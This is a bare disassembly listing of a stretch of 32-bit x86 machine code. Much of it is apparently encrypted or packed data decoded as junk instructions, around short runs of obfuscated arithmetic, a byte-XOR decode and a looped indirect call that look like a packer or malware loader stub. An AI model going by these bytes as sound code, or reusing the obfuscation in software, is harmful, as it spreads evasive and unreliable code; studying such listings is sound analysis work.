  40403c:	aas    
  40403d:	test   BYTE PTR es:[ebx-0x4d633486],cl
  404044:	stos   DWORD PTR es:[edi],eax
  404045:	bound  ebp,QWORD PTR ds:0x6af03a4f
  40404b:	mov    eax,ds:0x4260fb80
  404050:	popa   
  404051:	lea    ebp,[ebp+edi*1+0x41652e94]
  404058:	mov    ebx,esi
  40405a:	mov    ds:0x67b31d7,eax
  40405f:	push   ds
  404060:	and    al,0xb8
  404062:	dec    edx
  404063:	push   ds
  404064:	repnz rcr ebp,1
  404067:	ja     0x404042
  404069:	pop    es
  40406a:	fcos   
  40406c:	cmp    dh,BYTE PTR [esi+0x18ac64bd]
  404072:	aad    0xb3
  404074:	sar    DWORD PTR [edi],0x73
  404077:	test   BYTE PTR [ecx+0x3afe8782],0x3b
  40407e:	inc    eax
  40407f:	test   eax,0xde1da3c1
  404084:	inc    esp
  404085:	mov    bh,BYTE PTR [eax]
  404087:	inc    ebp
  404088:	sub    di,sp
  40408b:	enter  0x1edf,0x14
  40408f:	push   0x4b
  404091:	sub    ecx,edx
  404093:	cmp    eax,0x8128d7c1
  404098:	ins    DWORD PTR es:[edi],dx
  404099:	(bad)  
  40409a:	aad    0xa0
  40409c:	xchg   edx,eax
  40409d:	mov    dh,0x83
  40409f:	jge    0x40403e
  4040a1:	pop    edi
  4040a2:	cli    
  4040a3:	shl    esp,0x5d
  4040a6:	fucomip st,st(0)
  4040a8:	ss mov bl,0x44
  4040ab:	xor    ah,BYTE PTR [edi-0x3a997fea]
  4040b1:	mov    ch,0x5
  4040b3:	mov    cl,0xab
  4040b5:	ins    DWORD PTR es:[edi],dx
  4040b6:	pop    edx
  4040b8:	xchg   al,al
  4040ba:	dec    esp
  4040bb:	push   cs
  4040bc:	in     eax,dx
  4040bd:	dec    esp
  4040be:	add    eax,DWORD PTR [ebx]
  4040c0:	loopne 0x40408e
  4040c2:	inc    ebx
  4040c3:	imul   DWORD PTR [edx+0x847d4e6]
  4040c9:	repz dec esp
  4040cb:	xor    ah,BYTE PTR [ebx+0x43]
  4040ce:	mov    cl,bh
  4040d0:	dec    esi
  4040d1:	iret   
  4040d2:	sbb    ebx,ebx
  4040d4:	fld    QWORD PTR [ecx+0x161d8fc9]
  4040da:	or     DWORD PTR [ebx+0x18c25dc1],0xec8b5500
  4040e4:	sub    esp,0x58
  4040e7:	xor    DWORD PTR ds:0x4336b3,0x2c9d
  4040f1:	mov    ecx,DWORD PTR [ebp+0x8]
  4040f4:	sbb    eax,DWORD PTR ds:0x4336f3
  4040fa:	mov    eax,0x8a3a
  4040ff:	sub    DWORD PTR ds:0x43362b,0x44c4
  404109:	xor    ax,WORD PTR [ecx+0x20]
  40410d:	sub    ecx,0x3d49
  404113:	mov    ecx,0x3b00
  404118:	xor    DWORD PTR ds:0x4335c7,0x649a
  404122:	add    ax,cx
  404125:	movzx  eax,ax
  404128:	mov    DWORD PTR [ebp-0xc],eax
  40412b:	mov    ecx,DWORD PTR ds:0x4336db
  404131:	and    DWORD PTR ds:0x4336a7,ecx
  404137:	mov    BYTE PTR [ebp-0x1],0x7f
  40413b:	sub    ecx,0x46a5
  404141:	lea    eax,[ebp-0x1]
  404144:	mov    DWORD PTR [ebp-0x10],eax
  404147:	adc    DWORD PTR ds:0x4335bf,ecx
  40414d:	mov    al,BYTE PTR [ebp-0x1]
  404150:	movzx  ecx,WORD PTR ds:0x4335c3
  404157:	or     ecx,DWORD PTR ds:0x433617
  40415d:	mov    DWORD PTR ds:0x4335c3,ecx
  404163:	mov    ecx,DWORD PTR [ebp-0x10]
  404166:	xor    al,0x45
  404168:	sub    DWORD PTR ds:0x433673,0x7f5e
  404172:	sub    al,0x39
  404174:	mov    BYTE PTR [ecx],al
  404176:	mov    DWORD PTR [ebp-0x8],0xf89c8535
  40417d:	mov    DWORD PTR [ebp-0x10],0xf89c8534
  404184:	add    DWORD PTR ds:0x4336db,ebx
  40418a:	mov    eax,DWORD PTR [ebp-0x8]
  40418d:	sbb    ecx,0x3751
  404193:	mov    ecx,0x7510853
  404198:	jmp    0x40436a
  40419d:	mov    ds,ebp
  40419f:	inc    eax
  4041a0:	add    DWORD PTR [ebx-0x6f],0x1318dd55
  4041a7:	and    edx,esp
  4041a9:	add    DWORD PTR [esi+eax*1],ebx
  4041ac:	enter  0x24a8,0x7c
  4041b0:	jl     0x40415d
  4041b2:	jg     0x404230
  4041b4:	jl     0x404164
  4041b6:	push   ebx
  4041b7:	push   eax
  4041b8:	int    0x24
  4041ba:	je     0x40414a
  4041bc:	xchg   edx,eax
  4041bd:	jecxz  0x404145
  4041bf:	(bad)  
  4041c0:	sbb    eax,0x2ee8d56f
  4041c5:	cs dec esi
  4041c7:	and    ebx,DWORD PTR cs:[esp+edi*2]
  4041cb:	shl    DWORD PTR [ecx+0x7],0x62
  4041cf:	push   es
  4041d0:	aas    
  4041d1:	popa   
  4041d2:	in     al,dx
  4041d3:	aas    
  4041d4:	pop    esp
  4041d5:	push   edx
  4041d6:	push   es
  4041d7:	lock adc edi,eax
  4041da:	inc    edx
  4041db:	mov    esi,0x9a921293
  4041e0:	loopne 0x404209
  4041e2:	(bad)  
  4041e4:	and    edi,DWORD PTR [ecx]
  4041e6:	test   edx,esp
  4041e8:	mov    ds:0x44b486cb,al
  4041ed:	mov    ch,0x17
  4041ef:	or     DWORD PTR [edx],eax
  4041f1:	pop    ebp
  4041f2:	xlat   BYTE PTR ds:[ebx]
  4041f3:	and    edx,esi
  4041f5:	bound  ecx,QWORD PTR [esi+0x46]
  4041f8:	xchg   esi,eax
  4041f9:	add    BYTE PTR [ebx-0x41],ch
  4041fc:	adc    dh,BYTE PTR gs:[edx+0x74374706]
  404203:	sbb    edx,DWORD PTR [ebx+ecx*2+0xf]
  404207:	shl    BYTE PTR [ebx-0x2],0x5
  40420b:	lea    esi,[edx-0x28b8050f]
  404211:	ret    0xd638
  404214:	add    DWORD PTR [edx+0x76],esp
  404217:	mov    eax,0x9ac56c42
  40421c:	jg     0x404222
  40421e:	xchg   BYTE PTR cs:[esi],ch
  404221:	icebp  
  404222:	mov    al,ds:0xbebf47e5
  404227:	push   eax
  404228:	int    0x32
  40422a:	leave  
  40422b:	(bad)  
  40422c:	push   es
  40422d:	add    al,0xa2
  40422f:	xor    DWORD PTR [ecx],esp
  404231:	pop    edx
  404232:	or     DWORD PTR [eax],0xffffff91
  404235:	das    
  404236:	int3   
  404237:	mov    ah,0x32
  404239:	mov    edx,0xe2cf9180
  40423e:	aaa    
  40423f:	loop   0x404206
  404241:	out    dx,al
  404242:	add    edi,DWORD PTR [edx-0x2a]
  404245:	xchg   edx,eax
  404246:	shr    DWORD PTR [eax],0x54
  404249:	(bad)  
  40424a:	out    0x3b,eax
  40424c:	cmp    al,0x59
  40424e:	pop    esp
  40424f:	inc    esi
  404250:	stos   BYTE PTR es:[edi],al
  404251:	popa   
  404252:	int    0xea
  404254:	es rcr edi,cl
  404257:	test   BYTE PTR [edi+edi*8-0x7c],al
  40425b:	nop
  40425c:	mov    cl,0x92
  40425e:	mov    ebp,0xbbdf2d58
  404263:	pop    esp
  404264:	dec    ebx
  404265:	pop    ss
  404266:	mov    al,0xa7
  404268:	test   DWORD PTR [edx],ecx
  40426a:	loop   0x4042db
  40426c:	adc    dl,ch
  40426e:	(bad)  
  40426f:	push   0x7d8f1cc0
  404274:	enter  0xf924,0x53
  404278:	mov    ds,WORD PTR [edi+0x75d48b45]
  40427e:	jae    0x404293
  404280:	loope  0x4042fe
  404282:	xor    eax,0x30041c18
  404287:	adc    DWORD PTR [edx-0x4f],esi
  40428a:	ins    BYTE PTR es:[edi],dx
  40428b:	push   ss
  40428c:	mov    ds:0xb150114a,eax
  404291:	call   0x8a5069d9
  404296:	(bad)  
  404297:	daa    
  404298:	mov    ecx,0x5c628036
  40429d:	enter  0xb83b,0xe
  4042a1:	xor    DWORD PTR es:[ecx-0x68],edi
  4042a5:	test   al,0x3c
  4042a7:	or     bl,BYTE PTR [edi+0x6f]
  4042aa:	sbb    al,0xf2
  4042ac:	imul   esp,DWORD PTR ds:0x618efc04,0xa3e06b0e
  4042b6:	stc    
  4042b7:	outs   dx,DWORD PTR es:[esi]
  4042b9:	adc    ebp,DWORD PTR [esi]
  4042bb:	or     bl,BYTE PTR ds:0x90074ad2
  4042c1:	std    
  4042c2:	neg    DWORD PTR [edi-0x605e6223]
  4042c8:	ins    DWORD PTR es:[edi],dx
  4042c9:	jmp    0xf343:0x2ca3ee9b
  4042d0:	test   DWORD PTR [bp+0x11],edi
  4042d4:	cdq    
  4042d5:	sbb    ch,BYTE PTR [ebp-0x5a]
  4042d8:	pop    ecx
  4042d9:	mov    cl,0x74
  4042db:	dec    edx
  4042dc:	test   DWORD PTR [eax-0x427db6a1],eax
  4042e2:	mov    cl,0x19
  4042e4:	jne    0x404348
  4042e6:	cld    
  4042e7:	push   ecx
  4042e8:	ins    DWORD PTR es:[edi],dx
  4042e9:	outs   dx,BYTE PTR ds:[esi]
  4042ea:	mov    fs,WORD PTR [edi+0x72b0f3]
  4042f0:	xchg   edx,eax
  4042f1:	out    dx,al
  4042f2:	enter  0x1f3b,0xc7
  4042f6:	and    dl,BYTE PTR [eax+0x312ae8a6]
  4042fc:	fadd   DWORD PTR [eax+0x0]
  4042ff:	repz add eax,0xa90d18d6
  404305:	mov    edx,0x40872c33
  40430a:	imul   edi,DWORD PTR [ebx],0xffffffac
  40430d:	popf   
  40430e:	mov    edx,0x7aa6170f
  404313:	repz jo 0x404300
  404316:	mov    dh,0xe5
  404318:	xlat   BYTE PTR ds:[ebx]
  404319:	pop    eax
  40431a:	test   DWORD PTR [ecx+ebp*8],esp
  40431d:	mov    bh,0xdd
  40431f:	fldcw  WORD PTR [esi-0x40]
  404322:	sbb    al,0x68
  404324:	sti    
  404325:	mov    bh,0xc7
  404327:	sub    al,0x6a
  404329:	push   esp
  40432a:	add    al,0xb3
  40432c:	dec    esi
  40432d:	les    eax,FWORD PTR [ebp+0x49d07300]
  404333:	push   esp
  404334:	mov    DWORD PTR [ebx+0x63f93aaa],edi
  40433a:	add    DWORD PTR [edx+0x15],0xffffffae
  40433e:	pop    eax
  40433f:	(bad)  
  404340:	in     eax,dx
  404341:	ins    DWORD PTR es:[edi],dx
  404342:	add    ecx,eax
  404344:	push   es
  404345:	pusha  
  404346:	std    
  404347:	pushf  
  404348:	adc    eax,0xb48c9ec4
  40434d:	ins    BYTE PTR es:[edi],dx
  40434e:	or     edi,ebp
  404350:	daa    
  404351:	sbb    dh,bl
  404353:	daa    
  404354:	inc    ebx
  404355:	xor    cl,0xa1
  404358:	iret   
  404359:	sbb    eax,DWORD PTR [ebp-0x50]
  40435c:	bound  esp,QWORD PTR [ecx+ebp*1+0x33351f0e]
  404363:	sar    DWORD PTR [esi],0x0
  404366:	(bad)  
  404368:	xor    cl,BYTE PTR [eax+0x56]
  40436b:	or     DWORD PTR ds:0x43369f,0x4643
  404375:	xor    eax,ecx
  404377:	add    DWORD PTR ds:0x4336af,0x1b4e
  404381:	mov    esi,0x32729a
  404386:	or     DWORD PTR ds:0x4336af,0x43366f
  404390:	jmp    0x404562
  404395:	sub    ecx,DWORD PTR [edx]
  404397:	mov    esi,DWORD PTR [ebx-0x6dcc424b]
  40439d:	mov    cl,0x88
  40439f:	cmp    BYTE PTR [ecx],bh
  4043a1:	xchg   BYTE PTR [eax],dl
  4043a3:	or     eax,0x7c26e7fd
  4043a8:	jl     0x404355
  4043aa:	jg     0x404428
  4043ac:	jl     0x404339
  4043ae:	push   ss
  4043af:	xchg   ebp,eax
  4043b0:	xchg   esp,eax
  4043b1:	inc    edx
  4043b2:	xchg   edx,eax
  4043b3:	test   eax,0x81bada6
  4043b8:	outs   dx,BYTE PTR ds:[esi]
  4043b9:	arpl   WORD PTR [esi],bp
  4043bb:	pop    edi
  4043bc:	repz scas eax,DWORD PTR es:[edi]
  4043be:	mov    edi,0xd166c48b
  4043c3:	or     eax,0x6b6d30d5
  4043c8:	pop    ebp
  4043c9:	pop    esp
  4043ca:	jecxz  0x4043da
  4043cc:	jns    0x404423
  4043ce:	ror    dl,cl
  4043d0:	push   es
  4043d1:	jp     0x40441c
  4043d3:	icebp  
  4043d4:	cs ss adc al,0xaa
  4043d8:	iret   
  4043d9:	add    dl,BYTE PTR [edi-0x208b24d2]
  4043df:	push   eax
  4043e0:	pop    eax
  4043e1:	mov    bh,0xc
  4043e3:	mov    dl,0x8a
  4043e5:	fcomp  DWORD PTR [ecx]
  4043e7:	inc    esi
  4043e8:	pop    edx
  4043e9:	hlt    
  4043ea:	lods   eax,DWORD PTR ds:[esi]
  4043eb:	pop    ebp
  4043ec:	std    
  4043ed:	retf   0xb07e
  4043f0:	test   eax,0xf895e080
  4043f5:	popa   
  4043f6:	and    DWORD PTR [ebx+0x26902b50],ebp
  4043fc:	fcmovbe st,st(7)
  4043fe:	hlt    
  4043ff:	lea    edi,[ecx-0x18]
  404402:	aaa    
  404403:	inc    esp
  404404:	or     al,0x8
  404406:	scas   eax,DWORD PTR es:[edi]
  404407:	add    al,cl
  404409:	in     eax,dx
  40440a:	sub    al,0xcf
  40440c:	sbb    esi,DWORD PTR [edx-0x5e216dbf]
  404412:	out    dx,eax
  404413:	sbb    edi,edi
  404415:	mov    esp,0xa4b341ca
  40441a:	inc    esi
  40441b:	xchg   esi,eax
  40441c:	mov    ss,WORD PTR [edi]
  40441e:	sbb    eax,0x7a2bc72a
  404423:	add    DWORD PTR [ebp+0x67],0xffffffb0
  404427:	or     bl,BYTE PTR ds:0xa5301ee2
  40442d:	sbb    DWORD PTR [eax],eax
  40442f:	arpl   cx,ax
  404431:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404432:	add    al,BYTE PTR [eax-0x7d]
  404435:	lock jnp 0x40449b
  404438:	fidiv  WORD PTR [ecx]
  40443a:	popa   
  40443b:	jbe    0x404406
  40443d:	loope  0x40444d
  40443f:	mov    ds:0x363d59ce,al
  404444:	push   ds
  404445:	push   0x59
  404447:	cmp    al,0x62
  404449:	pop    edi
  40444a:	cdq    
  40444b:	add    BYTE PTR [edx-0x3c96d79e],0x4c
  404452:	aam    0x45
  404454:	test   BYTE PTR [edx-0x6100e32f],0x74
  40445b:	jne    0x40442e
  40445d:	mov    eax,DWORD PTR [edi]
  40445f:	or     al,0x76
  404461:	ins    BYTE PTR es:[edi],dx
  404462:	(bad)  
  404463:	fisubr WORD PTR [ebx]
  404465:	fisttp QWORD PTR [ecx-0x65]
  404468:	into   
  404469:	nop
  40446a:	jle    0x404480
  40446c:	push   ecx
  40446d:	inc    ecx
  40446e:	pop    ebx
  40446f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404470:	daa    
  404471:	xchg   ch,al
  404473:	xchg   edi,eax
  404474:	inc    edi
  404475:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404476:	xchg   ah,bh
  404478:	add    eax,0xfedc6772
  40447d:	add    al,0x5
  40447f:	pop    ds
  404480:	jns    0x40448e
  404482:	and    eax,0x7e567cfe
  404487:	icebp  
  404488:	mov    ds:0x1ac16aee,al
  40448d:	js     0x404477
  40448f:	scas   al,BYTE PTR es:[edi]
  404490:	out    0xee,al
  404492:	inc    ebp
  404493:	retf   
  404494:	leave  
  404495:	dec    edi
  404496:	xor    DWORD PTR [edx],ebx
  404498:	xchg   esp,eax
  404499:	pop    ebp
  40449a:	cld    
  40449b:	mov    esp,0xaa00388f
  4044a0:	outs   dx,BYTE PTR ds:[esi]
  4044a1:	push   ds
  4044a2:	fmul   DWORD PTR [ecx-0x3367a6b6]
  4044a8:	pop    edx
  4044a9:	push   ebx
  4044aa:	test   eax,0x4e363a79
  4044af:	pop    ecx
  4044b0:	mov    ?,ebp
  4044b2:	int    0xcd
  4044b4:	inc    esi
  4044b5:	out    0x1,al
  4044b7:	call   0x3f76:0xade9d85c
  4044be:	test   BYTE PTR [esi],dl
  4044c0:	daa    
  4044c1:	ins    DWORD PTR es:[edi],dx
  4044c2:	jle    0x4044b6
  4044c4:	pop    ss
  4044c5:	dec    edx
  4044c6:	imul   eax,DWORD PTR [esi+eax*8],0xa020d421
  4044cd:	xchg   esi,eax
  4044ce:	test   al,0xbc
  4044d0:	call   0xafde:0xae630c05
  4044d7:	mov    ch,0x5c
  4044d9:	or     cl,BYTE PTR [ebx-0x6d]
  4044dc:	sbb    BYTE PTR [ecx-0x6027c9e7],0x5c
  4044e3:	aas    
  4044e4:	xchg   edi,eax
  4044e5:	inc    ebx
  4044e6:	mov    eax,ds:0xd4e760cb
  4044eb:	sbb    al,0x57
  4044ed:	sti    
  4044ee:	repnz add esp,edx
  4044f1:	jmp    0x404495
  4044f3:	iret   
  4044f4:	push   edx
  4044f5:	ins    BYTE PTR es:[edi],dx
  4044f6:	inc    esi
  4044f7:	mov    edx,0x39bc1461
  4044fc:	data16 adc ah,BYTE PTR [ebp+0x6eaee92f]
  404503:	adc    DWORD PTR [ebp-0x1e],eax
  404506:	jne    0x4044c0
  404508:	pop    DWORD PTR [edx+0x69]
  40450b:	je     0x404519
  40450d:	xchg   ecx,eax
  40450e:	jne    0x404501
  404510:	sub    BYTE PTR [eax+0x798082cf],cl
  404516:	arpl   sp,dx
  404518:	imul   esp,DWORD PTR [edx-0x7e],0x7ca0c667
  40451f:	pop    esi
  404520:	sub    BYTE PTR [edx],al
  404522:	bound  esi,QWORD PTR [ebx]
  404524:	cs mov ch,0xc6
  404527:	das    
  404528:	sbb    eax,DWORD PTR [edx-0x5ebb1924]
  40452e:	xchg   esp,eax
  40452f:	rcl    DWORD PTR [edx+ebx*1+0x5d933f7],1
  404536:	mov    al,ds:0x53e8b074
  40453b:	sub    al,0xc
  40453d:	retf   
  40453e:	pop    eax
  40453f:	loopne 0x4045a4
  404541:	out    0x8,al
  404543:	cmp    eax,esp
  404545:	mov    ebx,0xa147cc11
  40454a:	cld    
  40454b:	sub    BYTE PTR [eax-0x23780dfe],0x25
  404552:	xor    BYTE PTR [edx],bl
  404554:	mov    esi,0xdcb0a92b
  404559:	push   0x38
  40455b:	or     dl,bh
  40455d:	xchg   esp,eax
  40455e:	cmp    al,0x99
  404560:	into   
  404561:	push   esi
  404562:	add    eax,esi
  404564:	jmp    0x404757
  404569:	mov    DWORD PTR ds:0x433627,0x6267
  404573:	mov    dl,BYTE PTR [ebp-0x1]
  404576:	mov    DWORD PTR ds:0x4335d3,0x1c06
  404580:	jmp    0x404752
  404585:	rol    DWORD PTR [edx+edi*1],cl
  404588:	push   ss
  404589:	aad    0xd2
  40458b:	ror    ebp,cl
  40458d:	mov    eax,0xdec2aa9d
  404592:	sbb    al,0x8b
  404594:	adc    dl,BYTE PTR [edx]
  404596:	and    BYTE PTR [esp+edi*2-0x55],bh
  40459a:	jg     0x404618
  40459c:	jl     0x40457f
  40459e:	sbb    al,BYTE PTR [ebx-0x44dab4a5]
  4045a4:	jne    0x40452b
  4045a6:	push   0x76
  4045a8:	fisttp DWORD PTR [ebp-0x6f]
  4045ab:	ficomp DWORD PTR [ecx-0x73]
  4045ae:	jl     0x4045a7
  4045b0:	jb     0x404563
  4045b2:	in     eax,dx
  4045b3:	cmp    al,0xbb
  4045b5:	dec    edi
  4045b6:	adc    DWORD PTR [esi],edx
  4045b8:	add    al,0xd4
  4045ba:	sbb    edi,DWORD PTR [esi]
  4045bc:	shl    BYTE PTR [ecx+0x4d],0x9
  4045c0:	iret   
  4045c1:	(bad)  
  4045c2:	call   0x5ef1:0xe1b159fe
  4045c9:	and    DWORD PTR [ebx+esi*1],edx
  4045cc:	push   es
  4045cd:	jp     0x40460a
  4045cf:	push   0xffffffcc
  4045d1:	pop    ss
  4045d2:	loopne 0x404591
  4045d4:	sub    eax,DWORD PTR [eax-0x3a138730]
  4045da:	ret    
  4045db:	jbe    0x404651
  4045dd:	rcl    bh,0x5
  4045e0:	cwde   
  4045e1:	stos   DWORD PTR es:[edi],eax
  4045e2:	lea    esp,ds:0x29bf7fae
  4045e8:	pop    esi
  4045e9:	test   DWORD PTR [ecx],eax
  4045eb:	push   cs
  4045ec:	stos   DWORD PTR es:[edi],eax
  4045ed:	dec    edi
  4045ee:	(bad)  
  4045ef:	jae    0x404607
  4045f1:	mov    DWORD PTR [esi+ecx*8+0x31086b26],eax
  4045f8:	or     esp,ebx
  4045fa:	jo     0x40463c
  4045fc:	pop    eax
  4045fd:	retf   
  4045fe:	arpl   WORD PTR [esi],bp
  404600:	mov    ebp,0x4fae7fbd
  404605:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404606:	push   cs
  404607:	pop    ecx
  404608:	sahf   
  404609:	jmp    0x66b05bbb
  40460e:	retf   0xe020
  404611:	imul   edi,DWORD PTR [eax+0x22],0x976a0276
  404618:	jb     0x404634
  40461a:	push   ss
  40461b:	fimul  WORD PTR [ebp+0x3ae5dce4]
  404621:	mov    ds:0x9570b792,eax
  404626:	dec    eax
  404627:	lods   eax,DWORD PTR ds:[esi]
  404628:	fdiv   QWORD PTR [esi]
  40462a:	mov    ah,0x37
  40462c:	jb     0x40466a
  40462e:	sbb    al,0xa0
  404630:	out    0x6d,eax
  404632:	jg     0x4046a0
  404634:	mov    ah,0xad
  404636:	jne    0x404619
  404638:	push   ecx
  404639:	loop   0x404606
  40463b:	fnstsw WORD PTR [edi]
  40463d:	cld    
  40463e:	add    ebp,ebx
  404640:	or     cl,BYTE PTR [esi+0x14]
  404643:	in     eax,dx
  404644:	sub    al,0x57
  404646:	jecxz  0x40463b
  404648:	jp     0x404665
  40464a:	lods   al,BYTE PTR ds:[esi]
  40464b:	imul   edi,DWORD PTR [eax-0x3ca2e206],0x81f68849
  404655:	je     0x404672
  404657:	test   eax,0x6e57a008
  40465c:	mov    edx,DWORD PTR ds:0x267d0869
  404662:	mov    al,ds:0xe2d2989b
  404667:	inc    eax
  404668:	mov    cl,0xde
  40466a:	push   0x64
  40466c:	retf   
  40466d:	xchg   DWORD PTR [edx-0x7d],esp
  404670:	push   esp
  404671:	mov    esp,0xf2058a1a
  404676:	xchg   esi,eax
  404677:	sahf   
  404678:	xchg   ebp,eax
  404679:	scas   al,BYTE PTR es:[edi]
  40467a:	dec    esp
  40467b:	adc    al,0xb6
  40467d:	dec    ecx
  40467e:	jno    0x404619
  404680:	enter  0xc27a,0xee
  404684:	xchg   esi,eax
  404685:	pop    ss
  404686:	dec    eax
  404687:	mov    DWORD PTR [esi+0x4ad68ce8],edi
  40468d:	xchg   edi,eax
  40468e:	leave  
  40468f:	mov    edi,0xc75954b7
  404694:	daa    
  404695:	mov    cl,0x95
  404697:	fwait
  404698:	loop   0x404689
  40469a:	iret   
  40469b:	loop   0x404710
  40469d:	mov    BYTE PTR [eax],bl
  40469f:	and    eax,0x26cccb9e
  4046a4:	shr    DWORD PTR [eax-0x4a05217d],1
  4046aa:	xchg   esi,eax
  4046ab:	cmc    
  4046ac:	fisubr WORD PTR [edi+0x118f5a5b]
  4046b2:	in     al,dx
  4046b3:	loop   0x40468a
  4046b5:	push   edi
  4046b7:	push   DWORD PTR gs:[ebx+0x557ca8d8]
  4046be:	retf   0xd2a0
  4046c1:	mov    ecx,0x590bd75b
  4046c6:	and    dl,BYTE PTR [esp+eax*1-0x220d4f12]
  4046cd:	(bad)  
  4046ce:	addr16 je 0x40473c
  4046d1:	lahf   
  4046d2:	xor    ch,BYTE PTR [ecx]
  4046d4:	std    
  4046d5:	inc    edi
  4046d6:	push   edx
  4046d7:	pop    ebx
  4046d8:	mov    bh,0x47
  4046da:	adc    al,0xfe
  4046dc:	or     BYTE PTR [esi-0x49],dh
  4046df:	loopne 0x4046bd
  4046e1:	push   0x4d
  4046e3:	sbb    DWORD PTR [ecx+0x7b],ebx
  4046e6:	add    BYTE PTR [ebx-0x712b55c7],al
  4046ec:	lds    ecx,FWORD PTR [ebx-0x2]
  4046ef:	pop    esp
  4046f0:	pop    eax
  4046f1:	add    ebx,DWORD PTR [ecx]
  4046f3:	push   ss
  4046f4:	pop    esp
  4046f5:	pop    esi
  4046f6:	aaa    
  4046f7:	pop    ebx
  4046f8:	cld    
  4046f9:	cmp    al,0x53
  4046fb:	ret    0x6090
  4046fe:	inc    edx
  4046ff:	sub    eax,0x68a40b5c
  404704:	cmp    cl,BYTE PTR [esi+eiz*8+0x57]
  404708:	dec    ecx
  404709:	cmc    
  40470a:	lods   al,BYTE PTR ds:[esi]
  40470b:	xchg   esi,eax
  40470c:	sbb    eax,0x75c9ba95
  404711:	daa    
  404712:	jl     0x404782
  404714:	test   esi,ebp
  404716:	and    edi,DWORD PTR [edi+0x1b]
  404719:	imul   eax,DWORD PTR ds:0x90de1f33,0x1ebd2b01
  404723:	sbb    cl,BYTE PTR [edi+esi*4]
  404726:	arpl   WORD PTR [edi+eax*2-0x21b42d78],cx
  40472d:	mov    esp,DWORD PTR [edi+0x665f5269]
  404733:	and    al,0x47
  404735:	test   BYTE PTR [ecx-0x28],dh
  404738:	retf   0xbc1e
  40473b:	xor    BYTE PTR [ebx-0x54fc83f6],0xda
  404742:	inc    eax
  404743:	test   ebx,ecx
  404745:	test   bl,bh
  404747:	mov    ah,0x79
  404749:	fyl2x  
  40474b:	(bad)  
  40474d:	dec    edi
  40474e:	cmp    al,0xdd
  404750:	repnz test eax,0xa8055488
  404756:	inc    eax
  404757:	mov    DWORD PTR ds:0x4335cf,0xde3
  404761:	cmp    eax,0x40
  404764:	jb     0x404569
  40476a:	sub    eax,DWORD PTR ds:0x4336d7
  404770:	mov    edx,DWORD PTR [ebp-0x8]
  404773:	mov    DWORD PTR ds:0x4335bf,0x14
  40477d:	cmp    DWORD PTR ds:0x4335bf,0x0
  404784:	je     0x4047dd
  40478a:	cmp    DWORD PTR ds:0x4335bf,0xa
  404791:	jne    0x4047ab
  404797:	push   DWORD PTR [ebp-0x24]
  40479a:	push   DWORD PTR [ebp-0xc]
  40479d:	push   0x42f8
  4047a2:	push   DWORD PTR [ebp-0x24]
  4047a5:	call   DWORD PTR ds:0x4120bc
  4047ab:	cmp    DWORD PTR ds:0x4335bf,0xb
  4047b2:	jne    0x4047c3
  4047b8:	mov    eax,ds:0x4335bf
  4047bd:	dec    eax
  4047be:	mov    ds:0x4335bf,eax
  4047c3:	mov    eax,ds:0x4335bf
  4047c8:	dec    eax
  4047c9:	mov    ds:0x4335bf,eax
  4047ce:	jmp    0x40477d
  4047d3:	or     DWORD PTR ds:0x433663,0x7ef0
  4047dd:	mov    eax,DWORD PTR [ebp-0xc]
  4047e0:	xor    edx,ecx
  4047e2:	xor    DWORD PTR ds:0x433657,0x4336ef
  4047ec:	add    edx,esi
  4047ee:	cmp    edx,eax
  4047f0:	mov    DWORD PTR ds:0x43365b,0x5bbb
  4047fa:	je     0x404a4f
  404800:	sbb    DWORD PTR ds:0x433667,edi
  404806:	push   ebx
  404807:	or     DWORD PTR ds:0x433673,ebx
  40480d:	jmp    0x4049df
  404812:	and    eax,0xfd09dbf4
  404817:	sbb    eax,0xea31f0f5
  40481c:	push   edx
  40481d:	loope  0x4047e3
  40481f:	pop    ss
  404820:	repz jg 0x40486c
  404823:	and    edi,DWORD PTR [esp+edi*2-0x55]
  404827:	jg     0x4048a5
  404829:	jl     0x4047ba
  40482b:	mov    ch,0x9b
  40482d:	and    dh,BYTE PTR [ebp-0x11d3f337]
  404833:	xchg   ebx,eax
  404834:	jmp    0x772f:0x89f574fb
  40483b:	and    DWORD PTR [edi-0x4ed10280],ecx
  404841:	mov    ah,0x7b
  404843:	adc    al,0x17
  404845:	mov    al,ds:0xe058ee9a
  40484a:	mov    al,ds:0x90c2ebf5
  40484f:	mov    edi,0xd9f251b7
  404854:	arpl   WORD PTR [eax-0x4a],ax
  404857:	ins    DWORD PTR es:[edi],dx
  404858:	es (bad) 
  40485a:	out    dx,eax
  40485b:	mov    eax,0xcbeeabd2
  404860:	cmp    ebp,DWORD PTR gs:[ebx-0x56]
  404864:	sbb    DWORD PTR [edi],edi
  404866:	push   edi
  404867:	sar    DWORD PTR [ebp-0x3d5e942e],0x1a
  40486e:	push   edi
  40486f:	adc    al,0x27
  404871:	jmp    0x2a53ae87
  404876:	inc    eax
  404877:	inc    eax
  404878:	xchg   BYTE PTR [ebp-0x6a7eca4c],al
  40487e:	cmc    
  40487f:	mov    ch,0xc6
  404881:	aam    0xc4
  404883:	scas   eax,DWORD PTR es:[edi]
  404884:	inc    esi
  404885:	out    0x2b,eax
  404887:	pop    ecx
  404888:	or     eax,0x5185fe66
  40488d:	dec    edi
  40488e:	xor    ebx,DWORD PTR [ebx-0x5ade7c73]
  404894:	iret   
  404895:	fdiv   DWORD PTR [edi]
  404897:	dec    ebx
  404898:	mov    al,ds:0xf9e39227
  40489d:	and    bh,BYTE PTR [ebx]
  40489f:	(bad)  
  4048a0:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  4048a2:	sub    ebp,esp
  4048a4:	data16 and dh,cl
  4048a7:	(bad)  
  4048a8:	sub    edi,esp
  4048aa:	push   0xfb8beafe
  4048af:	mov    ch,0x87
  4048b1:	dec    edi
  4048b2:	ds xchg edx,eax
  4048b4:	sub    DWORD PTR [esi+0x1e],ebx
  4048b7:	adc    eax,0xb1e8a40
  4048bc:	imul   DWORD PTR [ebp+0x34]
  4048bf:	and    cl,dl
  4048c1:	aas    
  4048c2:	jno    0x4048f9
  4048c4:	mov    cl,0x58
  4048c6:	inc    esp
  4048c7:	mov    al,0x8
  4048c9:	dec    esp
  4048ca:	fistp  QWORD PTR [edi+0x68da2fdd]
  4048d0:	push   esi
  4048d1:	and    cl,BYTE PTR [ecx+0x2b]
  4048d4:	leave  
  4048d5:	add    eax,0x50b94a34
  4048da:	out    0xc8,al
  4048dc:	sar    DWORD PTR [edx],cl
